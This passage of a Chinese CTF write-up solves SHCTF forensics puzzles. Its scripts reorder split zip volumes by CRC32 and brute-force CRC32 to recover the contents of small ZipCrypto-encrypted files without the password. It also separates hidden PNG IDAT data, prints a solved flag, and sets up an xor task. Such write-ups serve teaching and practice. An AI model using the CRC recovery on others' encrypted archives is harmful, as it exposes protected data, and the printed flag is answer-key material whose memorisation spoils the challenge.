+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_binary_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">try_decompress</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decompressed_data</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="o">-</span><span class="n">zlib</span><span class="o">.</span><span class="n">MAX_WBITS</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">decompressed_data</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">zlib</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">calculate_crc32</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">105734</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">zlib</span><span class="o">.</span><span class="n">crc32</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">directory</span> <span class="o">=</span> <span class="s2">&#34;屁&#34;</span>  <span class="c1"># 指定目录</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 指定开头和结尾文件</span>
+</span></span><span class="line"><span class="cl">    <span class="n">start_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">directory</span><span class="p">,</span> <span class="s2">&#34;屁.z66&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">end_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">directory</span><span class="p">,</span> <span class="s2">&#34;屁.z40&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">directory</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span> <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span> <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">directory</span><span class="p">,</span> <span class="n">f</span><span class="p">))]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 移除开头和结尾文件</span>
+</span></span><span class="line"><span class="cl">    <span class="n">files</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">start_file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">files</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">end_file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 生成剩余文件的全排列</span>
+</span></span><span class="line"><span class="cl">    <span class="n">permutations</span> <span class="o">=</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">files</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 计算排列的总数</span>
+</span></span><span class="line"><span class="cl">    <span class="n">total_permutations</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="mi">1</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">permutations</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 重置 permutations 以便再次迭代</span>
+</span></span><span class="line"><span class="cl">    <span class="n">permutations</span> <span class="o">=</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">files</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 已知的CRC32值</span>
+</span></span><span class="line"><span class="cl">    <span class="n">known_crc32</span> <span class="o">=</span> <span class="mh">0x0B6E238E</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">perm</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="n">permutations</span><span class="p">,</span> <span class="n">total</span><span class="o">=</span><span class="n">total_permutations</span><span class="p">,</span> <span class="n">desc</span><span class="o">=</span><span class="s2">&#34;Processing&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 将开头和结尾文件固定在首尾</span>
+</span></span><span class="line"><span class="cl">        <span class="n">combined_files</span> <span class="o">=</span> <span class="p">[</span><span class="n">start_file</span><span class="p">]</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">perm</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="n">end_file</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 连接所有文件的二进制内容</span>
+</span></span><span class="line"><span class="cl">        <span class="n">combined_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">read_binary_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span> <span class="k">for</span> <span class="n">file_path</span> <span class="ow">in</span> <span class="n">combined_files</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 尝试解压缩</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decompressed_data</span> <span class="o">=</span> <span class="n">try_decompress</span><span class="p">(</span><span class="n">combined_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">decompressed_data</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 计算解压后数据的CRC32值</span>
+</span></span><span class="line"><span class="cl">            <span class="n">calculated_crc32</span> <span class="o">=</span> <span class="n">calculate_crc32</span><span class="p">(</span><span class="n">decompressed_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># 检查CRC32值是否匹配</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">calculated_crc32</span> <span class="o">==</span> <span class="n">known_crc32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;解压成功！&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 输出解压后的数据</span>
+</span></span><span class="line"><span class="cl">                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;屁.svp&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decompressed_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;解压后的数据已保存到 屁.svp&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;没有找到可以成功解压的排列顺序。&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133114366.png?imageSlim" title="image-20241031133114366" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133114366.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133114366.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133114366.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133114366.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133114366.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031133114366">
+    </a></figure></p>
+<p>成功解压后得到术力口工程文件，可以使用 <code>Synthesizer V</code> 打开</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133240723.png?imageSlim" title="image-20241031133240723" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133240723.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133240723.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133240723.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133240723.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133240723.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031133240723">
+    </a></figure></p>
+<p>发现部分字和音素对不上。</p>
+<p>Synthesizer V 使用 ARPABET 作为音素标准，仔细查找可以找到一个字典</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/cmusphinx/sphinxtrain/blob/master/test/res/communicator.dic.cmu.full 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>翻译得到下面的话。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">S.,H.,C.,T.,F.,Open Curly Bracket,B.,L.,four,C.,K.,Underscore,M.,Y.,seven,H.,colon,five,H.,four,N.,H.,three,Close Curly Bracket
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SHCTF{BL4CK_MY7H:5H4NH3}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="拜师之旅-1" class="headerLink">
+    <a href="#%e6%8b%9c%e5%b8%88%e4%b9%8b%e6%97%85-1" class="header-mark"></a>拜师之旅②</h3><p>题目描述是个谐音梗&quot;挨打&quot;(IDAT)</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133546787.png?imageSlim" title="image-20241031133546787" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133546787.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133546787.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133546787.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133546787.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133546787.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031133546787">
+    </a></figure></p>
+<p>可以发现实质是两张图片放到了一起,一张<code>4995</code>为底 ,一张<code>5185</code>为底</p>
+<p>假flag的图片为前者优先显示,删掉对应的三个IDAT块后保留头尾IHDR,IEND再保存得到真flag图片</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133716221.png?imageSlim" title="image-20241031133716221" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133716221.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133716221.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133716221.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133716221.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133716221.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031133716221">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133706058.png?imageSlim" title="image-20241031133706058" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133706058.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133706058.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133706058.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133706058.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031133706058.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031133706058">
+    </a></figure></p>
+<h3 id="遮遮掩掩ccrc" class="headerLink">
+    <a href="#%e9%81%ae%e9%81%ae%e6%8e%a9%e6%8e%a9ccrc" class="header-mark"></a>遮遮掩掩?CCRC!</h3><p>ZipCrypto加密,并且文件内容大小只有3byte,结合题目考虑CRC爆破</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">crc_list</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x42582aaa</span><span class="p">,</span> <span class="mh">0xbce853c2</span><span class="p">,</span> <span class="mh">0x211fdb00</span><span class="p">,</span> <span class="mh">0x70c6b6fe</span><span class="p">,</span> <span class="mh">0x63ad436c</span><span class="p">,</span> <span class="mh">0x84bd90bd</span><span class="p">,</span> <span class="mh">0x55769db8</span><span class="p">,</span> <span class="mh">0x8a2a7829</span><span class="p">,</span> <span class="mh">0x5c66f4cd</span><span class="p">,</span> <span class="mh">0x8454f318</span><span class="p">,</span> <span class="mh">0x8c88cc6a</span><span class="p">,</span> <span class="mh">0x7eb2adde</span><span class="p">,</span> <span class="mh">0x078776df</span><span class="p">,</span> <span class="mh">0x21509dfb</span><span class="p">,</span> <span class="mh">0x0c975144</span><span class="p">,</span> <span class="mh">0xf51f79ac</span><span class="p">,</span> <span class="mh">0xf262197e</span><span class="p">,</span> <span class="mh">0x8b5919f7</span><span class="p">,</span> <span class="mh">0x8b5919f7</span><span class="p">,</span> <span class="mh">0x11d0d7ba</span><span class="p">,</span> <span class="mh">0x5c66f4cd</span><span class="p">,</span> <span class="mh">0x38457732</span><span class="p">,</span> <span class="mh">0xcdff1d1b</span><span class="p">,</span> <span class="mh">0xcdf2ddf2</span><span class="p">,</span> <span class="mh">0x7af934d6</span><span class="p">,</span> <span class="mh">0x21509dfb</span><span class="p">,</span> <span class="mh">0x5bf57dc6</span><span class="p">,</span> <span class="mh">0xd617d273</span><span class="p">,</span> <span class="mh">0xf9d901d6</span><span class="p">,</span> <span class="mh">0xcdf2ddf2</span><span class="p">,</span> <span class="mh">0x21509dfb</span><span class="p">,</span> <span class="mh">0xe98e7a37</span><span class="p">,</span> <span class="mh">0xc94d437d</span><span class="p">,</span> <span class="mh">0x1bbe8b92</span><span class="p">,</span> <span class="mh">0x7dc6ef2a</span><span class="p">,</span> <span class="mh">0x0f1e9f47</span><span class="p">,</span> <span class="mh">0x5c66f4cd</span><span class="p">,</span> <span class="mh">0x54f6ab19</span><span class="p">,</span> <span class="mh">0x3b6a9c6f</span><span class="p">,</span> <span class="mh">0x9e80fced</span><span class="p">,</span> <span class="mh">0x94f0383e</span><span class="p">,</span> <span class="mh">0xcc7fcc02</span><span class="p">,</span> <span class="mh">0x8eca39aa</span><span class="p">,</span> <span class="mh">0x7b2fb1b3</span><span class="p">,</span> <span class="mh">0x62dd04ef</span><span class="p">,</span> <span class="mh">0x211fdb00</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">target_crc</span> <span class="ow">in</span> <span class="n">crc_list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">k</span><span class="p">])</span>  <span class="c1"># 构造3字节数据</span>
+</span></span><span class="line"><span class="cl">                <span class="n">crc</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">crc32</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>  <span class="c1"># 计算CRC32值</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">crc</span> <span class="o">==</span> <span class="n">target_crc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Found matching data: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">flag</span><span class="o">+=</span><span class="n">data</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;解密得到:&#39;</span><span class="o">+</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到的密文是熊曰加密，到解密网站去解密</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215227488.png?imageSlim" title="image-20241031215227488" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215227488.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215227488.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215227488.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215227488.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215227488.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031215227488">
+    </a></figure></p>
+<p><a href="http://hi.pcmoe.net/index.html" target="_blank" rel="noopener noreferrer">http://hi.pcmoe.net/index.html</a></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215723568.png?imageSlim" title="image-20241031215723568" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215723568.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215723568.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215723568.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215723568.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031215723568.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031215723568">
+    </a></figure></p>
+<h2 id="week3" class="headerLink">
+    <a href="#week3" class="header-mark"></a>Week3</h2><h3 id="xor" class="headerLink">
+    <a href="#xor" class="header-mark"></a>xor</h3><p><strong>「出题过程：」</strong></p>
+<p>创建一个文件flag<code>(/data/flag)</code>并写入flag字符串</p>
+<p>然后创建/randomfile.py并执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import random
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def generateRandomBytearray(length):
+</span></span><span class="line"><span class="cl">    random_bytes = bytearray()
+</span></span><span class="line"><span class="cl">    for _ in range(length):
+</span></span><span class="line"><span class="cl">        random_bytes.append(random.randint(0, 255))
+</span></span><span class="line"><span class="cl">    return random_bytes
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">arrs = []
+</span></span><span class="line"><span class="cl">flag = bytearray(open(&#34;data/flag&#34;, &#34;rb&#34;).read())
+</span></span><span class="line"><span class="cl">files = [&#34;data/flag&#34;]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">for i in range(256):
+</span></span><span class="line"><span class="cl">    byte_arr = generateRandomBytearray(len(flag))
+</span></span><span class="line"><span class="cl">    arrs.append(byte_arr)
+</span></span><span class="line"><span class="cl">    files.append(f&#34;data/file{i}&#34;)
+</span></span><span class="line"><span class="cl">    with open(f&#34;data/file{i}&#34;, &#34;wb&#34;) as file:
+</span></span><span class="line"><span class="cl">        file.write(byte_arr)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>于是在/data/目录下得到了file0~file255这256个文件</p>
+<p>再创建一个xor.py<code>(/data/xor.py)</code>，代码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import xor
+</span></span><span class="line"><span class="cl">from os import listdir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">files = [file for file in listdir() if file != &#39;xor.py&#39; and file != &#39;flag&#39;]
+</span></span><span class="line"><span class="cl">flag = bytearray(open(&#34;flag&#34;, &#34;rb&#34;).read())
+</span></span><span class="line"><span class="cl">for file in files:
+</span></span><span class="line"><span class="cl">    file = open(file, &#39;rb&#39;).read()
+</span></span><span class="line"><span class="cl">    flag = xor(flag, file)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print(flag)
+</span></span><span class="line"><span class="cl">with open(&#39;xor&#39;, &#39;wb&#39;) as f:
+</span></span><span class="line"><span class="cl">    f.write(flag)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行后得到了xor<code>(/data/xor)</code>文件</p>
+<p>题目描述给出了最后执行的两条命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
